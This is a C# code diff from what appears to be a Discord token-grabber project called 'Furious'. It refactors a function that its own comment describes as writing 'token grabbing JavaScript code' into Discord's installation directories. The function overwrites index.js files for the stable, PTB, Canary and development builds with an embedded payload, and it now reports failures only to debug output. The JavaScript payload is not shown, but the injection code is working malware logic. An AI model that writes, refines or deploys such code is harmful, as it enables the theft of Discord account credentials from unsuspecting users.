@@ -59,80 +59,26 @@ namespace Furious
 		}
 
 		///Writes the token grabbing JavaScript code into available Discord directories.
-		internal static async Task WriteDiscord(string path)
+		internal static async Task WriteDiscord(string path, string javascriptPath)
 		{
-			string value = string.Empty;
-			if (File.Exists(DiscordPath))
+			if (File.Exists(path))
 			{
 				try
 				{
-					using (StreamReader discordReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.index.txt")))
+					string value = string.Empty;
+					using (StreamReader reader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(javascriptPath)))
 					{
-						value = await discordReader.ReadToEndAsync();
+						value = await reader.ReadToEndAsync();
 					}
-					using (StreamWriter discordWriter = new StreamWriter(path))
+					using (StreamWriter writer = new StreamWriter(path))
 					{
-						await discordWriter.WriteAsync(value);
-					}
-				}
-				catch
-				{
-					Console.WriteLine("Error writing to index.js in Discord path.");
-				}
-			}
-			if (File.Exists(PTBPath))
-			{
-				try
-				{
-					using (StreamReader ptbWriter = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.ptb.txt")))
-					{
-						value = await ptbWriter.ReadToEndAsync();
-					}
-					using (StreamWriter ptbWriter = new StreamWriter(path))
-					{
-						await ptbWriter.WriteAsync(value);
+						await writer.WriteAsync(value);
 					}
 				}
 				catch
-				{
-					Console.WriteLine("Error writing to index.js in DiscordPTB path.");
-				}
-			}
-			if (File.Exists(CanaryPath))
-			{
-				try
-				{
-					using (StreamReader canaryReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.canary.txt")))
-					{
-						value = await canaryReader.ReadToEndAsync();
-					}
-					using (StreamWriter canaryWriter = new StreamWriter(path))
-					{
-						await canaryWriter.WriteAsync(value);
-					}
-				}
-				catch
-				{
-					Console.WriteLine("Error writing to index.js in Discord Canary path.");
-				}
-			}
-			if (File.Exists(DevelopmentPath))
-			{
-				try
-				{
-					using (StreamReader devReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.development.txt")))
-					{
-						value = await devReader.ReadToEndAsync();
-					}
-					using (StreamWriter devReader = new StreamWriter(path))
-					{
-						await devReader.WriteAsync(value);
-					}
-				}
-				catch
-				{
-					Console.WriteLine("Error writing to index.js in Discord Dev path.");
-				}
+                		{
+					Debug.WriteLine("Error writing to " + path);
+                		}
 			}
 		}
 
